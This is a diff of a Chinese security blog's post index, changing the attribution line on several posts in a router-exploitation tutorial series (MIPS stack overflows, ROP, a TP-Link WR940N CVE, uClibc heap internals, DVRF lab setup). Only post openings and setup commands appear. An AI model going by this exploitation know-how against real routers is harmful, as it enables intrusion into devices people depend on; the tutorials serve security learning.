+<p><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a></p>
+<p><a href="http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt" target="_blank" rel="external">http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt</a></p>
+<p><a href="http://blog.angelboy.tw/" target="_blank" rel="external">http://blog.angelboy.tw/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> file struct </tag>
             
         </tags>
         
@@ -759,7 +1263,7 @@
       <title><![CDATA[一步一步pwn路由器之radare2使用实战]]></title>
       <url>/2017/11/01/step_by_step_pwn_router_part8.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>前文讲了一些 <code>radare2</code> 的特性相关的操作方法。本文以一个 <code>crackme</code> 来具体介绍下 <code>radare2</code> 的使用</p>
 <p>程序的地址： <a href="https://gitee.com/hac425/blog_data/blob/master/crackme0x03" target="_blank" rel="external">在这里</a></p>
@@ -814,7 +1318,7 @@
       <title><![CDATA[一步一步pwn路由器之radare2使用全解]]></title>
       <url>/2017/10/31/step_by_step_pwn_router_part7.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p><code>radare2</code> 最近越来越流行，已经进入 <code>github</code> 前 25了，看到大佬们纷纷推荐，为了紧跟时代潮流，我也决定探究探究这款 <code>神器</code> 。下面画画重点，以便以后需要用了，可以方便查找。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先是安装 <code>radare2</code> ,直接去官方 <code>github</code> 安照指示安装即可。先把源代码下载下来</p>
@@ -957,7 +1461,7 @@
       <title><![CDATA[一步一步pwn路由器之wr940栈溢出漏洞分析与利用]]></title>
       <url>/2017/10/29/step_by_step_pwn_router_part5.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>这个是最近爆出来的漏洞，漏洞编号：<a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
 <p>固件链接：<a href="http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip" target="_blank" rel="external">http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip</a></p>
@@ -996,7 +1500,7 @@
       <title><![CDATA[一步一步pwn路由器之uClibc中malloc&&free分析]]></title>
       <url>/2017/10/28/step_by_step_pwn_router_part6.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>栈溢出告一段落。本文介绍下 <code>uClibc</code> 中的 <code>malloc</code> 和 <code>free</code> 实现。为堆溢出的利用准备基础。<code>uClibc</code> 是 <code>glibc</code> 的一个精简版，主要用于嵌入式设备，比如路由器就基本使用的是 <code>uClibc</code>， 简单自然效率高。所以他和一般的<code>x86</code>的堆分配机制会有些不一样。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>uClibc 的 <code>malloc</code> 有三种实现，分别为：</p>
@@ -1057,7 +1561,7 @@
       <title><![CDATA[一步一步pwn路由器之rop技术实战]]></title>
       <url>/2017/10/28/step_by_step_pwn_router_part4.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>这次程序也是 DVRF 里面的，他的路径是 <code>pwnable/ShellCode_Required/stack_bof_02</code> , 同样是一个简单的栈溢出，不过这个程序里面没有提供 <code>getshell</code> 的函数，需要我们执行shellcode来实现。这个正好实战下前文: <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a>,中分析的在mips下的通用的rop技术。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>qemu</code> 运行目标程序，并等待 <code>gdb</code> 来调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/ShellCode_Required/stack_bof_02  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure></p>
@@ -1131,7 +1635,7 @@
       <title><![CDATA[一步一步pwn路由器之栈溢出实战]]></title>
       <url>/2017/10/27/step_by_step_pwn_router_part3.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>本文以 <a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="external">DVRF</a> 中的第一个漏洞程序 <code>stack_bof_01</code> 为例，在实战 <code>MIPS</code> 架构中栈溢出的简单利用。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>去github上面把 DVRF 下载下来，然后用 <code>binwalk</code> 解开</p>
@@ -1225,7 +1729,7 @@
       <title><![CDATA[一步一步pwn路由器之路由器环境修复&&rop技术分析]]></title>
       <url>/2017/10/26/step_by_step_pwn_router_part2.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>拿到路由器的固件后，第一时间肯定是去运行目标程序，一般是web服务程序。我们可以去 <code>/etc/init.d/</code> 找启动文件，或者看看一些有可能的目录。一般来说路由器的程序很少的情况下是可以直接用qemu运行起来的。我们需要做一些修复的工作，本文会介绍一个常用的方法，后面会分析在 <code>mips uclibc</code> 中常用的 <code>rop</code> 手法。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>运行环境修复</strong></p>
@@ -1290,7 +1794,7 @@
       <title><![CDATA[一步一步pwn路由器之环境搭建]]></title>
       <url>/2017/10/26/step_by_step_pwn_router_part1.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
 <hr>
 <p>正式进入路由器的世界了。感觉路由器这块就是固件提取，运行环境修复比较麻烦，其他部分和一般的 pwn 差不多。由于大多数路由器是 mips 架构的，本文就以搭建  <code>MIPS运行、调试平台</code> 为例介绍环境的搭建。其他架构类似。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h6 id="安装-与-配置-Qemu"><a href="#安装-与-配置-Qemu" class="headerlink" title="安装 与 配置 Qemu:"></a>安装 与 配置 Qemu:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install qemu </div><div class="line">sudo apt-get install qemu-user-static</div><div class="line">sudo apt-get install qemu-system</div></pre></td></tr></table></figure>
